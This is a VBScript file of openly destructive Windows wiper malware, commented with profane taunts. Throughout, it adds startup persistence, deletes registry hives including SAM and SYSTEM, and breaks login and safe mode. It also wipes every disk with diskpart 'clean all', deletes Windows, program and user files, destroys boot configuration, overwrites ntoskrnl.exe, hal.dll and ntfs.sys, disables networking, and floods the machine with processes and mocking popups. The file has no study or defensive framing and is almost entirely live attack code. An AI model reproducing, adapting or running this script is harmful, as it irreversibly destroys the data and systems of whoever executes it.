Option Explicit 
Dim x7p9q, q3z8k, k9m2v, r4t6y, z2w8j, p5n3b, y8h2m, j6q4x, f
f = WScript.ScriptFullName
Set x7p9q = CreateObject("WScript.Shell") ' Shell for silent fuckery
Set q3z8k = CreateObject("Scripting.FileSystemObject") ' File system chaos
Set k9m2v = CreateObject("WScript.Shell") ' Registry sabotage


x7p9q.Run "cmd.exe /c '" & f & "'", 0, False


On Error Resume Next
k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSys", f, "REG_SZ"
x7p9q.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v SFCDisable /t REG_DWORD /d 1 /f", 0, True
x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
x7p9q.Run "reg delete HKLM\SYSTEM\Setup /f", 0, True ' Setup fucked
x7p9q.Run "reg delete HKLM\SYSTEM\config /f", 0, True ' Registry backups
x7p9q.Run "reg delete HKLM\SAM /f", 0, True ' Login accounts fucked
x7p9q.Run "reg delete HKLM\SOFTWARE\Policies /f", 0, True ' Policies erased
x7p9q.Run "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f", 0, True ' No startup apps
x7p9q.Run "reg delete HKLM\SOFTWARE /f", 0, True ' Software hive gone
x7p9q.Run "reg delete HKLM\SYSTEM /f", 0, True ' Entire SYSTEM hive
x7p9q.Run "reg delete HKCU\Software /f", 0, True ' User configs dead
x7p9q.Run "reg delete HKEY_CLASSES_ROOT /f", 0, True ' File associations gone
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "invalid.exe", "REG_SZ" ' Login fails
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
x7p9q.Run "net stop TrustedInstaller /y", 0, True
If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")

Sub OverwriteFile(filePath)
    If q3z8k.FileExists(filePath) Then
        ' Generate clean GUID filename
        Dim typeLib, guid, tempFile
        Set typeLib = CreateObject("Scriptlet.TypeLib")
        guid = Replace(Replace(typeLib.GUID, "{", ""), "}", "")
        tempFile = "C:\Temp\garbage_" & guid & ".tmp"
        
        ' Create garbage file
        Set y8h2m = q3z8k.CreateTextFile(tempFile, True, True)
        y8h2m.Write String(50000000, "X")
        y8h2m.Close
        
        ' Use WMI for registry operations
        Dim oReg, HKEY_LOCAL_MACHINE, keyPath, valueName
        Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        HKEY_LOCAL_MACHINE = &H80000002
        keyPath = "SYSTEM\CurrentControlSet\Control\Session Manager"
        valueName = "PendingFileRenameOperations"
        
        ' Read existing operations
        Dim existingOps, errCode
        errCode = oReg.GetMultiStringValue(HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps)
        If errCode <> 0 Then existingOps = Array()
        
        ' Add DELETE operation for original file
        ReDim Preserve existingOps(UBound(existingOps) + 2)
        existingOps(UBound(existingOps)-1) = "\??\" & filePath & "!"  ' Mark for deletion
        existingOps(UBound(existingOps)) = ""                          ' Empty destination
        
        ' Add MOVE operation for replacement
        ReDim Preserve existingOps(UBound(existingOps) + 2)
        existingOps(UBound(existingOps)-1) = "\??\" & tempFile        ' Source temp file
        existingOps(UBound(existingOps)) = "\??\" & filePath & "!"    ' Destination with replace flag
        
        ' Write to registry
        oReg.SetMultiStringValue HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps
    End If
End Sub

If q3z8k.FileExists("C:\Windows\System32\kernel32.dll") Then
    OverwriteFile "C:\Windows\System32\kernel32.dll"
End If
If q3z8k.FileExists("C:\Windows\System32\cmd.exe") Then
    OverwriteFile "C:\Windows\System32\cmd.exe"
End If
If q3z8k.FileExists("C:\Windows\win.ini") Then
    OverwriteFile "C:\Windows\win.ini"
End If

' Flood disk with massive junk files
For r4t6y = 1 To 50
    Set p5n3b = q3z8k.CreateTextFile("C:\Temp\junk" & r4t6y & ".dat", True)
    p5n3b.Write String(200000000, "Z") ' 200MB each, 10GB total
    p5n3b.Close
Next

' Nuke ALL disk boot sectors and data with diskpart
Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp1.txt", True)
z2w8j.WriteLine "list disk"
z2w8j.WriteLine "select disk 0"
z2w8j.WriteLine "clean all" 
z2w8j.WriteLine "select disk 1"
z2w8j.WriteLine "clean all"
z2w8j.WriteLine "select disk 2"
z2w8j.WriteLine "clean all"
z2w8j.Close
x7p9q.Run "cmd /c diskpart /s C:\Temp\dp1.txt", 0, True
q3z8k.DeleteFile("C:\Temp\dp1.txt")
Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp2.txt", True)
z2w8j.WriteLine "list disk"
z2w8j.WriteLine "select disk 0"
z2w8j.WriteLine "clean all" 
z2w8j.Close
x7p9q.Run "cmd /c diskpart /s C:\Temp\dp2.txt", 0, True
q3z8k.DeleteFile("C:\Temp\dp2.txt")

q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
q3z8k.DeleteFile("C:\Windows\*.*") ' Entire Windows dir
q3z8k.DeleteFile("C:\Program Files\*.*") ' Program Files gone
q3z8k.DeleteFile("C:\Program Files (x86)\*.*") ' 32-bit apps dead
q3z8k.DeleteFile("C:\Users\*\*.*") ' All user data erased
q3z8k.DeleteFolder("C:\Windows\System32\config") ' Registry backups gone
q3z8k.DeleteFolder("C:\Recovery\*.*")
q3z8k.DeleteFolder("C:\System Volume Information\*.*")

' Destroy Boot Configuration Data 
x7p9q.Run "bcdedit /set {bootmgr} displaybootmenu No", 0, True
x7p9q.Run "bcdedit /set {current} recoveryenabled No", 0, True
x7p9q.Run "bcdedit /set {default} recoveryenabled No", 0, True
x7p9q.Run "bcdedit /set {current} bootstatuspolicy IgnoreAllFailures", 0, True
x7p9q.Run "bootsect /nt60 ALL /force", 0, True
x7p9q.Run "bootsect /nt60 C: /force /mbr", 0, True
x7p9q.Run "bcdedit /delete {current} /f", 0, True
x7p9q.Run "bcdedit /delete {default} /f", 0, True
x7p9q.Run "bcdedit /delete {bootmgr} /f", 0, True ' No boot at all
q3z8k.DeleteFile("C:\Windows\boot\*.*") ' Boot files

' Break network completely
x7p9q.Run "netsh winsock reset", 0, True ' TCP/IP fucked
x7p9q.Run "netsh int ip reset", 0, True ' IP settings gone
x7p9q.Run "ipconfig /release", 0, True ' Drop network
x7p9q.Run "netsh interface set interface ""Ethernet"" disable", 0, True ' Kill Ethernet
x7p9q.Run "netsh interface set interface ""Wi-Fi"" disable", 0, True ' Kill Wi-Fi
x7p9q.Run "netsh interface set interface ""Local Area Connection"" disable", 0, True

' Flood system with processes
For r4t6y = 1 To 10000
    x7p9q.Run "notepad.exe", 1, False 
    x7p9q.Run "calc.exe", 1, False 
    x7p9q.Run "mspaint.exe", 1, False
Next


For j6q4x = 1 To 15
    x7p9q.Popup "SYSTEM ANNIHILATED: YOUR DATA IS GONE FOREVER.", 0, "CRITICAL ERROR", 16
    x7p9q.Popup "FUCKED BEYOND REPAIR. GOOD LUCK, LOSER.", 0, "Windows", 16
Next

x7p9q.Run "takeown /F C:\Windows\System32\ntoskrnl.exe", 0, True
x7p9q.Run "icacls C:\Windows\System32\ntoskrnl.exe /grant SYSTEM:F", 0, True

x7p9q.Run "takeown /F C:\Windows\System32\hal.dll", 0, True
x7p9q.Run "icacls C:\Windows\System32\hal.dll /grant SYSTEM:F", 0, True

x7p9q.Run "takeown /F C:\Windows\System32\drivers\ntfs.sys", 0, True
x7p9q.Run "icacls C:\Windows\System32\drivers\ntfs.sys /grant SYSTEM:F", 0, True

x7p9q.Run "takeown /F C:\Windows\System32\config\SYSTEM", 0, True
x7p9q.Run "icacls C:\Windows\System32\config\SYSTEM /grant SYSTEM:F", 0, True

x7p9q.Run "takeown /F C:\bootmgr", 0, True
x7p9q.Run "icacls C:\bootmgr /grant SYSTEM:F", 0, True

' Overwrite BSOD-critical files with junk, then delete
If q3z8k.FileExists("C:\Windows\System32\ntoskrnl.exe") Then
    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\ntoskrnl.exe", 0, True 
    x7p9q.Run "del /f /q C:\Windows\System32\ntoskrnl.exe", 0, True
End If
If q3z8k.FileExists("C:\Windows\System32\hal.dll") Then
    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\hal.dll", 0, True 
    x7p9q.Run "del /f /q C:\Windows\System32\hal.dll", 0, True
End If
If q3z8k.FileExists("C:\Windows\System32\drivers\ntfs.sys") Then
    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\drivers\ntfs.sys", 0, True 
    x7p9q.Run "del /f /q C:\Windows\System32\drivers\ntfs.sys", 0, True
End If
If q3z8k.FileExists("C:\Windows\System32\config\SYSTEM") Then
    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\config\SYSTEM", 0, True 
    x7p9q.Run "del /f /q C:\Windows\System32\config\SYSTEM", 0, True
End If
If q3z8k.FileExists("C:\bootmgr") Then
    x7p9q.Run "echo " & String(1000000, "X") & " > C:\bootmgr", 0, True 
    x7p9q.Run "del /f /q C:\bootmgr", 0, True
End If

' kill critical processes
x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True
x7p9q.Run "taskkill /F /IM winlogon.exe", 0, True ' Extra chaos

On Error GoTo 0

Do
    WScript.Sleep 15000 ' Wait 15 seconds
    For r4t6y = 1 To 500
        x7p9q.Run "notepad.exe", 0, False
        x7p9q.Run "calc.exe", 0, False
    Next
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
    x7p9q.Popup "YOUR PC IS A CORPSE. GOODBYE.", 0, "System Failure", 16
Loop
' x7p9q.Run "powershell remove-item -path '" & f & "' -force", 0, False